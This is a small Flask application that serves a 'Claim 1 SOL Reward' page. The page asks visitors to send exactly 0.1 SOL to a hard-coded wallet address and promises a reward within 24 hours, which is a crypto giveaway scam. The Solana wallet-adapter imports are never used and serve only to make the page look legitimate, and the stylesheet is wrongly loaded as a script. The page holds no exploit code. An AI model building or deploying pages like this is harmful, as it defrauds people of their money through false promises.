from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL Reward</title>
  <script type="module">
    import {
      ConnectionProvider,
      WalletProvider
    } from "https://cdn.skypack.dev/@solana/wallet-adapter-react";
    import {
      PhantomWalletAdapter,
      SolflareWalletAdapter
    } from "https://cdn.skypack.dev/@solana/wallet-adapter-wallets";
    import {
      WalletModalProvider,
      WalletMultiButton
    } from "https://cdn.skypack.dev/@solana/wallet-adapter-react-ui";

    const wallets = [new PhantomWalletAdapter(), new SolflareWalletAdapter()];

    const network = "mainnet-beta";
  </script>

  <style>
    body {
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    h1 {
      font-size: 2.2rem;
    }
    .qr {
      width: 200px;
      border-radius: 10px;
      margin: 20px 0;
    }
    .wallet-button {
      margin: 20px;
    }
    .claim-message {
      margin-top: 30px;
      font-size: 1rem;
      color: #00ff90;
    }
  </style>
</head>
<body>
  <h1>🎁 Claim 1 SOL Reward</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to this address:</p>
  <p style="word-break: break-all;">{{ wallet }}</p>
  <img src="{{ qr_url }}" class="qr" alt="QR Code" />

  <br />
  <wallet-multi-button class="wallet-button"></wallet-multi-button>

  <div class="claim-message">
    ✅ Once you send 0.1 SOL, wait up to 24h. Volume is high.
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
